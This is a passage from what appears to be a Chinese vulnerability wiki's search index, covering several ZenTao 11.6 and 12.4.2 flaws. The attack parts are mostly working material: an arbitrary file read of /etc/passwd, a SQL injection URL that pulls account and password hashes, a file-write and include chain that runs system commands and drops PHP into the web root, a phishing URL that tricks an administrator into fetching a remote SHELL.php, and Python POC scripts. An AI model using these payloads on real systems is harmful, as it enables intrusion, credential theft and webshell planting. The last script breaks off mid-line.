'$this-\u003epost') or strpos($file[$i], 'fixer::input') or strpos($file[$i], '$_POST')) { $data-\u003epost = true; } } return $data; } 这里与第一种大同小异，只是调用了不同模块的方法 看到 fileName = dirname(filepath) 这段则为返回的目录名 所以读取**/etc/passwd则需要写为/etc/passwd/1**来绕过 http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/etc/passwd/1 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/:4:2","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-getmethod-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"禅道 11.6 api-getModel-api-sql-sql 后台SQL注入漏洞 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 禅道 11.6 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 先对禅道的调用流程进行分析,先查看目录为www/index.php首页文件中 这里使用router::createApp创建了一个APP对象 $app = router::createApp('pms', dirname(dirname(__FILE__)), 'router'); 来到framework/base/router.class.php文件查看到createApp方法 public static function createApp($appName = 'demo', $appRoot = '', $className = '') { if(empty($className)) $className = __CLASS__; return new $className($appName, $appRoot); } 这里New了一个对象，查看一下调用方法(348行) 在358行处调用了setConfigRoot方法 $this-\u003esetConfigRoot(); public function setConfigRoot() { $this-\u003econfigRoot = $this-\u003ebasePath . 'config' . DS; } 在363行处调用了loadMainConfig方法 $this-\u003eloadMainConfig(); public function loadMainConfig() { /* 初始化$config对象。Init the $config object. */ global $config, $filter; if(!is_object($config)) $config = new config(); $this-\u003econfig = $config; /* 加载主配置文件。 Load the main config file. */ $mainConfigFile = $this-\u003econfigRoot . 'config.php'; if(!file_exists($mainConfigFile)) $this-\u003etriggerError(\"The main config file $mainConfigFile not found\", __FILE__, __LINE__, $exit = true); include $mainConfigFile; } 这里包含了配置文件config.php配置文件，文件目录为**/config/config.php** 在25行定义了调用方法 $config-\u003erequestType = 'PATH_INFO'; // 请求类型：PATH_INFO|PATHINFO2|GET。 The request type: PATH_INFO|PATH_INFO2|GET. $config-\u003erequestFix = '-'; // PATH_INFO和PATH_INFO2模式的分隔符。 The divider in the url when PATH_INFO|PATH_INFO2. $config-\u003emoduleVar = 'm'; // 请求类型为GET：模块变量名。 requestType=GET: the module var name. $config-\u003emethodVar = 'f'; // 请求类型为GET：模块变量名。 requestType=GET: the method var name. $config-\u003eviewVar = 't'; // 请求类型为GET：视图变量名。 requestType=GET: the view var name. $config-\u003esessionVar = 'zentaosid'; // 请求类型为GET：session变量名。 requestType=GET: the session var name. $config-\u003eviews = ',html,json,mhtml,xhtml,'; // 支持的视图类型。 Supported view formats. 可以发现这里存在两种路由PATH_INFO|PATH_INFO2：一种是m、f、t来进行调用。另外一种是通过-来进行调用 在index.php中的66行 $app-\u003eparseRequest(); public function parseRequest() { if($this-\u003econfig-\u003erequestType == 'PATH_INFO' or $this-\u003econfig-\u003erequestType == 'PATH_INFO2') { $this-\u003eparsePathInfo(); $this-\u003esetRouteByPathInfo(); } elseif($this-\u003econfig-\u003erequestType == 'GET') { $this-\u003eparseGET(); $this-\u003esetRouteByGET(); } else { $this-\u003etriggerError(\"The request type {$this-\u003econfig-\u003erequestType} not supported\", __FILE__, __LINE__, $exit = true); } } 看到这一条则是判断力两种调用方法 $this-\u003econfig-\u003erequestType == 'PATH_INFO' or $this-\u003econfig-\u003erequestType == 'PATH_INFO2' 跟进setRouteByPathInfo方法 public function setRouteByPathInfo() { if(!empty($this-\u003eURI)) { /* * 根据$requestFix分割符，分割网址。 * There's the request seperator, split the URI by it. **/ if(strpos($this-\u003eURI, $this-\u003econfig-\u003erequestFix) !== false) { $items = explode($this-\u003econfig-\u003erequestFix, $this-\u003eURI); $this-\u003esetModuleName($items[0]); $this-\u003esetMethodName($items[1]); } /* * 如果网址中没有分隔符，使用默认的方法。 * No reqeust seperator, use the default method name. **/ else { $this-\u003esetModuleName($this-\u003eURI); $this-\u003esetMethodName($this-\u003econfig-\u003edefault-\u003emethod); } } else { $this-\u003esetModuleName($this-\u003econfig-\u003edefault-\u003emodule); // 使用默认模块 use the default module. $this-\u003esetMethodName($this-\u003econfig-\u003edefault-\u003emethod); // 使用默认方法 use the default method. } $this-\u003esetControlFile(); } 所以可以推断出调用的方法 例如登录页面有两种访问方法 http://xxx.xxx.xxx.xxx/index.php?m=user\u0026f=login http://xxx.xxx.xxx.xxx/user-login.html 再看一下checkPriv方法 public function checkPriv() { $module = $this-\u003eapp-\u003egetModuleName(); $method = $this-\u003eapp-\u003egetMethodName(); if(!empty($this-\u003eapp-\u003euser-\u003emodifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this-\u003eisOpenMethod($module, $method)) return true; if(!$this-\u003eloadModel('user')-\u003eisLogon() and $this-\u003eserver-\u003ephp_auth_user) $this-\u003euser-\u003eidentifyByPhpAuth(); if(!$this-\u003eloadModel('user')-\u003eisLogon() and $this-\u003ecookie-\u003eza) $this-\u003euser-\u003eidentifyByCookie(); if(isset($this-\u003eapp-\u003euser)) { if(!commonModel::hasPriv($module, $method)) $this-\u003edeny($module, $method); } else { $referer = helper::safe64Encode($this-\u003eapp-\u003egetURI(true)); die(js::locate(helper::create","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC 登陆后访问 http://xxx.xxx.xxx.xxx/api-getModel-user-getRealNameAndEmails-users=admin http://xxx.xxx.xxx.xxx/api-getModel-api-sql-sql=select+account,password+from+zt_user ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-api-sql-sql-%E5%90%8E%E5%8F%B0sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"禅道 11.6 api-getModel-editor-save-filePath 任意文件写入漏洞 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 禅道 11.6 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"环境搭建 这里使用docker环境搭建 docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6 访问 http://xxx.xxx.xxx.xxx:8084 按步骤安装即可 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 这里造成漏洞的原因同样是调用接口权限无限制的原因 接口出现漏洞的原因具体参考可以查看上一篇 禅道 11.6版本 SQL注入漏洞 关于此漏洞的完整分析 查看module/api/ediyor/moudel.php下的save方法 public function save($filePath) { $fileContent = $this-\u003epost-\u003efileContent; $evils = array('eval', 'exec', 'passthru', 'proc_open', 'shell_exec', 'system', '$$', 'include', 'require', 'assert'); $gibbedEvils = array('e v a l', 'e x e c', ' p a s s t h r u', ' p r o c _ o p e n', 's h e l l _ e x e c', 's y s t e m', '$ $', 'i n c l u d e', 'r e q u i r e', 'a s s e r t'); $fileContent = str_ireplace($gibbedEvils, $evils, $fileContent); if(get_magic_quotes_gpc()) $fileContent = stripslashes($fileContent); $dirPath = dirname($filePath); $extFilePath = substr($filePath, 0, strpos($filePath, DS . 'ext' . DS) + 4); if(!is_dir($dirPath) and is_writable($extFilePath)) mkdir($dirPath, 0777, true); if(is_writable($dirPath)) { file_put_contents($filePath, $fileContent); } else { die(js::alert($this-\u003elang-\u003eeditor-\u003enotWritable . $extFilePath)); } } $filePath参数和$fileContent参数 我们是可控的 调用方法往 /tmp写入一个phpinfo() http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell.php POST:fileContent=\u003c?php phpinfo();?\u003e 在利用 禅道 11.6版本 任意文件读取漏洞 第二种方法来文件包含 http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 也可以写入网站目录中 先获取地址 http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell POST：fileContent=\u003c?php system('find / -name ioncube.php')?\u003e');?\u003e 访问http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 得到目录为 /app/zentaopma/www 请求改为 http://xxx.xxx.xxx.xxx/api-getModel-editor-save-filePath=/tmp/shell fileContent=\u003c?php file_put_contents('/app/zentaopms/www/xxx.php', '\u003c?php phpinfo();?\u003e');?\u003e 再去访问http://xxx.xxx.xxx.xxx/api-getModel-api-getMethod-filePath=/tmp/shell/1 则会再网站目录下生成 xxx.php 文件 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: zentao version = 11.6 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mZentaosid \u003e\u003e\u003e xxxxxxxxxxxxxx(cookie字段) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] 禅道版本为:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] 获取版本失败 \\033[0m\", e) sys.exit(0) def POC_2(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } data = {\"fileContent\":\"\u003c?php phpinfo();?\u003e\"} write_url = target_url + \"/api-getModel-editor-save-filePath=/tmp/test\" try: response = requests.post(url=write_url, data=data, headers=headers, timeout=10) print(\"\\033[32m[o] 尝试写入php文件... \\033[0m\") except: print(\"\\033[31m[x] 写入php文件失败 \\033[0m\") sys.exit(0) def POC_3(target_url, zentaosid): headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": \"zentaosid={}\".format(zentaosid) } vuln_url = target_url + \"/api-getModel-api-getMethod-filePath=/tmp/test/1\" try: response = requests.get(url=vuln_url, headers=headers, timeout=10) if \"System\" in response.text: print(\"\\033[32m[o] 成功写入文件，存在漏洞, 访问 {}/api-getModel-api-getMethod-filePath=/tmp/test/1/ 查看 \\033[0m\".format(target_url)) else: print(\"\\033[31m[x] 读取php文件失败 \\033[0m\") except: print(\"\\033[31m[x] 读取php文件失败 \\033[0m\") if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl \u003e\u003e\u003e \\033[0m\")) zentaosid = str(input(\"\\033[35mZentaosid \u003e\u003e\u003e \\033[0m\")) POC_1(target_url) POC_2(target_url, zentaosid) POC_3(target_url, zentaosid) ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/:5:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-11.6-api-getmodel-editor-save-filepath-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"禅道 12.4.2 CSRF漏洞 CNVD-2020-68552 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-csrf%E6%BC%8F%E6%B4%9E-cnvd-2020-68552/:0:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-csrf%E6%BC%8F%E6%B4%9E-cnvd-2020-68552/"},{"categories":null,"content":"漏洞描述 可以针对禅道的部分模块制造恶意URL地址发送给管理员，当管理员登录时会执行模块的恶意请求,可用于进行钓鱼请求 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-csrf%E6%BC%8F%E6%B4%9E-cnvd-2020-68552/:1:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-csrf%E6%BC%8F%E6%B4%9E-cnvd-2020-68552/"},{"categories":null,"content":"漏洞影响 禅道 \u003c= 12.4.2版本 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-csrf%E6%BC%8F%E6%B4%9E-cnvd-2020-68552/:2:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-csrf%E6%BC%8F%E6%B4%9E-cnvd-2020-68552/"},{"categories":null,"content":"环境搭建 百度下12.4.2的禅道环境按步骤安装下载即可 禅道官方网站 调用接口查询版本信息 http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-csrf%E6%BC%8F%E6%B4%9E-cnvd-2020-68552/:3:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-csrf%E6%BC%8F%E6%B4%9E-cnvd-2020-68552/"},{"categories":null,"content":"漏洞复现 这里利用 禅道 小于12.4.2 文件上传漏洞 CNVD-C-2020-121325(可参照上一篇文章) 来构造一个恶意的URL地址 查看module/common/model.php的checkPriv方法 public function checkPriv() { $module = $this-\u003eapp-\u003egetModuleName(); $method = $this-\u003eapp-\u003egetMethodName(); if($this-\u003eapp-\u003eisFlow) { $module = $this-\u003eapp-\u003erawModule; $method = $this-\u003eapp-\u003erawMethod; } if(!empty($this-\u003eapp-\u003euser-\u003emodifyPassword) and (($module != 'my' or $method != 'changepassword') and ($module != 'user' or $method != 'logout'))) die(js::locate(helper::createLink('my', 'changepassword'))); if($this-\u003eisOpenMethod($module, $method)) return true; if(!$this-\u003eloadModel('user')-\u003eisLogon() and $this-\u003eserver-\u003ephp_auth_user) $this-\u003euser-\u003eidentifyByPhpAuth(); if(!$this-\u003eloadModel('user')-\u003eisLogon() and $this-\u003ecookie-\u003eza) $this-\u003euser-\u003eidentifyByCookie(); if(isset($this-\u003eapp-\u003euser)) { if(!defined('IN_UPGRADE')) $this-\u003esession-\u003euser-\u003eview = $this-\u003eloadModel('user')-\u003egrantUserView(); $this-\u003eapp-\u003euser = $this-\u003esession-\u003euser; if(!commonModel::hasPriv($module, $method)) $this-\u003edeny($module, $method); } else { $referer = helper::safe64Encode($this-\u003eapp-\u003egetURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); } } 这里的代码片段为鉴权函数，可以看到最后一句代码 $referer = helper::safe64Encode($this-\u003eapp-\u003egetURI(true)); die(js::locate(helper::createLink('user', 'login', \"referer=$referer\"))); 所以当调用当前权限不允许的方法时，会进行跳转，并在**$referer**参数缓存调用的方法URL，当使用这个跳转的地址登录时则会直接调用此方法 URL地址构造过程 http://xxx.xxx.xxx.xxx/www/index.php?m=user\u0026f=login\u0026referer=/www/index.php.m=client\u0026f=download\u0026version=1\u0026link=HTTP://peiqi.tech/SHELL.php 将link参数base64加密 http://xxx.xxx.xxx.xxx/www/index.php?m=user\u0026f=login\u0026referer=/www/index.php.m=client\u0026f=download\u0026version=1\u0026link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 将referer参数以 . 做分割base64加密两边字符 http://xxx.xxx.xxx.xxx/www/index.php?m=user\u0026f=login\u0026referer=L3d3dy9pbmRleC5waHA.bT1jbGllbnQmZj1kb3dubG9hZCZ2ZXJzaW9uPTEmbGluaz1TRlJVVURvdkwzQmxhWEZwTG5SbFkyZ3ZVMGhGVEV3dWNHaHc= 将这个URL地址发送给管理员，当管理员登录时则会触发恶意文件下载 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-csrf%E6%BC%8F%E6%B4%9E-cnvd-2020-68552/:4:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-csrf%E6%BC%8F%E6%B4%9E-cnvd-2020-68552/"},{"categories":null,"content":"禅道 12.4.2 后台任意文件上传漏洞 CNVD-C-2020-121325 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/:0:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/"},{"categories":null,"content":"漏洞描述 百度云安全团队监测到禅道官方发布了文件上传漏洞的风险通告，该漏洞编号为CNVD-C-2020-121325，漏洞影响禅道\u003c=12.4.2版本。登陆管理后台的恶意攻击者可以通过fopen/fread/fwrite方法读取或上传任意文件，成功利用此漏洞可以读取目标系统敏感文件或获得系统管理权限。我们对漏洞进行了复现和分析，由于需要登录后台才可以利用，实际风险相对较低，建议受影响的禅道用户尽快升级到最新版。 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/:1:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/"},{"categories":null,"content":"漏洞影响 禅道 \u003c= 12.4.2版本 ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/:2:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/"},{"categories":null,"content":"环境搭建 百度下12.4.2的禅道环境按步骤安装下载即可 禅道官方网站 调用接口查询版本信息 http://xxx.xxx.xxx.xxx/www/index.php?mode=getconfig ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/:3:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/"},{"categories":null,"content":"漏洞复现 漏洞触发需要后台权限 根据漏洞描述查看修改后的代码片段 修改前 public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; return parent::downloadZipPackage($version, $link); } 修改后 public function downloadZipPackage($version, $link) { $decodeLink = helper::safe64Decode($link); if(!preg_match('/^https?\\:\\/\\//', $decodeLink)) return false; $file = basename($link); $extension = substr($file, strrpos($file, '.') + 1); if(strpos(\",{$this-\u003econfig-\u003efile-\u003eallowed},\", \",{$extension},\") === false) return false; return parent::downloadZipPackage($version, $link); } 这里传入的参数为版本和link地址，然后base64解码，正则判断是否为http或https协议，这里的正则过滤并不完整，所以可以绕过用于下载恶意文件 可以大写http或请求FTP来绕过正则 跟进一下parent::downloadZipPackage这个方法，跟着来到zentao\\module\\client\\model.php文件中 public function downloadZipPackage($version, $link) { ignore_user_abort(true); set_time_limit(0); if(empty($version) || empty($link)) return false; $dir = \"data/client/\" . $version . '/'; $link = helper::safe64Decode($link); $file = basename($link); if(!is_dir($this-\u003eapp-\u003ewwwRoot . $dir)) { mkdir($this-\u003eapp-\u003ewwwRoot . $dir, 0755, true); } if(!is_dir($this-\u003eapp-\u003ewwwRoot . $dir)) return false; if(file_exists($this-\u003eapp-\u003ewwwRoot . $dir . $file)) { return commonModel::getSysURL() . $this-\u003econfig-\u003ewebRoot . $dir . $file; } ob_clean(); ob_end_flush(); $local = fopen($this-\u003eapp-\u003ewwwRoot . $dir . $file, 'w'); $remote = fopen($link, 'rb'); if($remote === false) return false; while(!feof($remote)) { $buffer = fread($remote, 4096); fwrite($local, $buffer); } fclose($local); fclose($remote); return commonModel::getSysURL() . $this-\u003econfig-\u003ewebRoot . $dir . $file; } 可以简单看到这里获取link传入的文件名，通过fopen打开该文件，写入禅道目录www/data/client/version中 查看一下有没有调用这个方法的地方 找到了download方法调用了这个漏洞点，所以我们有两种下载恶意文件的方法 http://xxx.xxx.xxx.xxx/www/client-download-[$version参数]-[base64加密后的恶意文件地址].html http://xxx.xxx.xxx.xxx/www/index.php?m=client\u0026f=download\u0026version=[$version参数]\u0026link=[base64加密后的恶意文件地址] 首先先上传一个恶意文件，可以是FTP也可以是HTTP 例如我上传的文件URL为http://peiqi.tech/SHELL.php http://peiqi.tech/SHELL.php | base64加密 HTTP://peiqi.tech/SHELL.php | SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 请求地址则为 http://xxx.xxx.xxx.xxx/www/index.php?m=client\u0026f=download\u0026version=1\u0026link=SFRUUDovL3BlaXFpLnRlY2gvU0hFTEwucGhw 下载的目录地址为zentaopms\\www\\data\\client\\1 目录为version名称 成功上传webshell ","date":"0001-01-01","objectID":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/:4:0","tags":null,"title":"","uri":"/%E7%A6%85%E9%81%93-12.4.2-%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E-cnvd-c-2020-121325/"},{"categories":null,"content":"漏洞POC POC使用需要拥有后台Cookie #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m公众号 : PeiQi文库 \\033[0m') print('+ \\033[34mVersion: zentao version \u003c= 12.4.2 \\033[0m') print('+ \\033[36m使用格式: python3 CNVD-C-2020-121325.py \\033[0m') print('+ \\033[36mUrl \u003e\u003e\u003e http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mShell \u003e\u003e\u003e http://xxx.xxx.xxx.xxx/shell.php(恶意文件地址) \\033[0m') print('+ \\033[36mZentaosid \u003e\u003e\u003e xxxxxxxxxxxxxx(cookie字段) \\033[0m') print('+------------------------------------------') def POC_1(target_url): version_url = target_url + \"/www/index.php?mode=getconfig\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: response = requests.get(url=version_url, timeout=20, headers=headers) version = json.loads(response.text)['version'] print(\"\\033[32m[o] 禅道版本为:{}\\033[0m\".format(version)) except Exception as e: print(\"\\033[31m[x] 获取版本失败 \\033[0m\", e) def POC_2(target_url, shell_url, zentaosid): options = shell_url.split(\"://\") if options[0] == \"http\": shell_url = 